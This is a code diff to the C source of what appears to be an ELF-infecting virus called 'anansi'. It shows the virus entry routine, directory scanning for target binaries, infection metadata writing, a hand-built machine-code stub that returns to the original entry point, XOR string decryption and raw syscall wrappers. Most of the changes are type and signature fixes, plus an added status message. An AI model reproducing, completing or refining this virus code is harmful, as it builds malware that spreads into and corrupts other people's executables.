@@ -18,7 +18,6 @@
 #define MAGIC_INITIALIZER_RAN 0xDEADBEEF
 
 #define STDOUT STDOUT_FILENO
-#define FAILURE -1
 #define SUCCESS 0
 
 #ifdef DEBUG
@@ -45,8 +44,8 @@ typedef struct elfbin {
 
 	int fd;
 	int perm;
-	int orig_size;
-	int new_size;
+	uint64_t orig_size;
+	uint64_t new_size;
 	char *f_path;
 
 	void *read_only_mem;
@@ -81,15 +80,14 @@ unsigned int dynamic_entry_count(Elf64_Dyn *dyn_start, Elf64_Xword dyn_size);
 void write_vx_meta_data(Elfbin *target, uint8_t *vx_start, uint64_t vx_size);
 char *create_full_path(char *directory, char *filename);
 void process_elf_initialize(Elfbin *target, char *full_path);
-int process_elf(Elfbin *target, int attr, int perm, int len);
+int process_elf(Elfbin *target, int attr, int perm, uint64_t len);
 void process_elf_free(Elfbin *target);
 bool valid_target(Elfbin *target, int min_size, bool no_shared_objects);
 
 #ifdef DEBUG
 	int anansi_printf(char *format, ...);
 	char *itoa(void *data_num, int base, int var_type);
-//	char *itoa_final(unsigned long n, int base);
-	char *itoa_final(long n, int base, char *output, size_t len);
+	char *itoa_final(long n, int base, char *output);
 #endif
 
 /* vx-mechanics functions and global vars*/
@@ -104,7 +102,7 @@ int anansi_exit(int status);
 long anansi_write(int fd, const void *buf, size_t count);
 long anansi_read(int fd, void *buf, size_t count);
 void *anansi_mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);
-long anansi_stat(char *path, struct stat *statbuf);
+long anansi_stat(const char *path, struct stat *statbuf);
 long anansi_munmap(void *addr, size_t len);
 long anansi_open(const char *pathname, int flags, int mode);
 long anansi_getdents64(int fd, void *dirp, size_t count);
@@ -176,7 +174,8 @@ void vx_main()
 	char *full_path = NULL;
 
 	struct linux_dirent *d;
-	int cwd_fd, nread, attr, max_target = MAX_TARGET;
+	long nread;
+	int cwd_fd, attr, max_target = MAX_TARGET;
 	const size_t DIR_LISTING_SIZE = 5000;
 
 	Elfbin target;
@@ -184,6 +183,8 @@ void vx_main()
 	uint64_t vx_size = (uint8_t *)&end_vx - (uint8_t *)&real_start;
 	uint8_t *vx_start = (uint8_t *)get_eip() - ((uint8_t *)&foobar - (uint8_t *)&real_start); //calculates the address of vx_main
 
+	char anansi_msg[] = "anansi-works\n";
+	anansi_write(STDOUT_FILENO, anansi_msg, anansi_strlen(anansi_msg));
 #ifdef DEBUG
 	anansi_printf("vx_start @ 0x0%lx\n", vx_start);
 	anansi_printf("vx_size @ 0x%lx\n", vx_size);
@@ -308,7 +309,9 @@ void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_ent
 	unsigned char inst_three[] = "\x48\x05";
 	unsigned char inst_four[] = "\xff\xe0";
 	unsigned char inst_five[] = "\x48\x8b\x04\x24";
-	uint64_t stub_vx_size = target->vx_size + 5;
+
+	uint64_t stub_vx_size = target->vx_size + 5; //account for call instruction and addr
+
 	int vx_size_cpy = target->vx_size;
 	int vx_size_actual_len = 0;
 
@@ -320,7 +323,7 @@ void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_ent
 
 	anansi_memset(epilog, 0x00, 30);
 	epilog[0] = 0xe8;
-	epilog[1] = relative_call_len + vx_size_actual_len;
+	epilog[1] = relative_call_len + vx_size_actual_len; //adjust relative call len
 	anansi_memcpy(epilog + 5, inst_two, 2); //sub <vx_size>, %rax
 	anansi_memcpy(epilog + 7, &stub_vx_size, 4);
 
@@ -333,8 +336,7 @@ void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_ent
 	anansi_memcpy(epilog + 23, inst_four, 2); //jmp rax
 
 	anansi_memcpy(epilog + 25, inst_five, 4); // mov rax, [rsp] #get_eip relative call enters here
-	anansi_memcpy(epilog + 29, "\xc3", 1 ); // ret
-
+	epilog[29] = 0xc3; //ret
 	anansi_memcpy(insertion + target->vx_size, epilog, 30);
 }
 
@@ -362,7 +364,7 @@ bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
 	int p_entry;
 
 	Elf64_Xword dyn_size;
-	int dyn_entry_cnt;
+	unsigned int dyn_entry_cnt;
 
 	int dynamic_phdr;
 	bool found_dynamic = false;
@@ -377,7 +379,7 @@ bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
 	char init_array[] = ".init_array";
 	char fini_array[] = ".fini_array";
 
-	Elf64_Word rela_count = 0;
+	Elf64_Word rela_count;
 	for(p_entry = 0; p_entry < target->ehdr->e_phnum; p_entry++) {
 		if(target->phdr[p_entry].p_type == PT_DYNAMIC) {
 			found_dynamic = true;
@@ -436,7 +438,7 @@ bool within_section(Elfbin *target, char *section, uint64_t addr)
 	uint8_t *strtab = (uint8_t *)(target->read_only_mem + strtab_section->sh_offset);
 
 	for(int i = 0; i < target->ehdr->e_shnum; i++) {
-		if(!anansi_strncmp(&strtab[target->shdr[i].sh_name], section, anansi_strlen(section))) {
+		if(!anansi_strncmp((const char *)&strtab[target->shdr[i].sh_name], section, anansi_strlen(section))) {
 			start_addr = target->shdr[i].sh_addr;
 			end_addr = target->shdr[i].sh_addr + target->shdr[i].sh_size;
 			return (addr >= start_addr) && (addr <= end_addr);
@@ -493,7 +495,7 @@ unsigned int get_random_int()
 	/* in either case we will use another src of entropy */
 	if(max_reads == 0 || !cpu_supports_rdrand) {
 		s_len = anansi_strlen(encrypted_dev_slash_random);
-		dev_slash_random = anansi_malloc(s_len); //TODO: failpoint
+		dev_slash_random = anansi_malloc(s_len);
 		if(dev_slash_random == NULL)
 			goto clean_up;
 
@@ -517,8 +519,8 @@ unsigned int get_random_int()
 
 void decrypt_xor(char *encrypted_str, char *decrypted_str)
 {
-	char *d_ptr = decrypted_str;;
-	int key = 0x890c6d01;
+	char *d_ptr = decrypted_str;
+	unsigned int key = 0x890c6d01;
 
 	while(*encrypted_str != '\0')
 		*d_ptr++ = *encrypted_str++ ^ key;
@@ -545,7 +547,7 @@ void write_vx_meta_data(Elfbin *target, uint8_t *vx_start, uint64_t vx_size)
 	target->vx_size = vx_size;
 }
 
-int process_elf(Elfbin *target, int attr, int perm, int len)
+int process_elf(Elfbin *target, int attr, int perm, uint64_t len)
 {
 	int fd;
 	void *mem = NULL;
@@ -679,7 +681,7 @@ void process_elf_free(Elfbin *target)
 
 		if(target->perm == PROCESS_ELF_O_RDWR)
 			if(target->write_only_mem != NULL)
-				anansi_munmap(target->write_only_mem, target->new_size);;
+				anansi_munmap(target->write_only_mem, target->new_size);
 
 
 		anansi_close(target->fd);
@@ -748,7 +750,7 @@ char *create_full_path(char *directory, char *filename)
 int anansi_printf(char *format, ...)
 {
 	char *string, *ptr, *str_integer;
-	int count, base = 0;
+	int count = 0, base = 0;
 
 
 	int var_num_int;
@@ -859,13 +861,13 @@ char *itoa(void *data_num, int base, int var_type) {
 	anansi_memset(output, 0, NUM_CONV_BUF_SIZE);
 
 	if(var_type == ANANSI_UNSIGNED_INT)
-		return itoa_final(*(unsigned int *)data_num, base, output, NUM_CONV_BUF_SIZE);
+		return itoa_final(*(unsigned int *)data_num, base, output);
 	if(var_type == ANANSI_INT)
-		return itoa_final(*(int *)data_num, base, output, NUM_CONV_BUF_SIZE);
+		return itoa_final(*(int *)data_num, base, output);
 	if(var_type == ANANSI_UNSIGNED_LONG)
-		return itoa_final(*(unsigned long *)data_num, base, output, NUM_CONV_BUF_SIZE);
+		return itoa_final(*(unsigned long *)data_num, base, output);
 	else
-		return itoa_final(*(long *)data_num, base, output, NUM_CONV_BUF_SIZE);
+		return itoa_final(*(long *)data_num, base, output);
 }
 /*
 char *itoa_final(unsigned long n, int base)
@@ -910,7 +912,7 @@ char *itoa_final(unsigned long n, int base)
 }
  */
 
-char *itoa_final(long n, int base, char *output, size_t len) {
+char *itoa_final(long n, int base, char *output) {
 	char buf[NUM_CONV_BUF_SIZE];
 	char conv[] = "0123456789abcdef";
 	char hex_symbol[] = "0x";
@@ -1169,7 +1171,7 @@ __exit_syscall(int, anansi_exit, status, int);
 __write_syscall(long, anansi_write, fd, int, buf, const void *, count, size_t);
 __read_syscall(long, anansi_read, fd, int, buf, void *, count, size_t);
 __mmap_syscall(void *, anansi_mmap, addr, void *, len, size_t, prot, int, flags, int, fildes, int, off, off_t);
-__stat_syscall(long, anansi_stat, path, char *, statbuf, struct stat *);
+__stat_syscall(long, anansi_stat, path, const char *, statbuf, struct stat *);
 __munmap_syscall(long, anansi_munmap, addr, void *, len, size_t);
 __open_syscall(long, anansi_open, pathname, const char *, flags, int, mode, int);
 __getdents64_syscall(long, anansi_getdents64, fd, int, dirp, void *, count, size_t);
@@ -1185,11 +1187,12 @@ __close_syscall(long, anansi_close, fd, int);
 -  Dev Note: Write out exit (syscall) routine.
 */
 
-unsigned long get_eip() {
+__attribute__ ((naked)) unsigned long get_eip() {
 	asm("call foobar\n"
 		".globl foobar\n"
 		"foobar:\n"
-		"pop %rax\n");
+		"pop %rax\n"
+		"ret\n");
 }
 
 __attribute__((naked)) void end_code() {
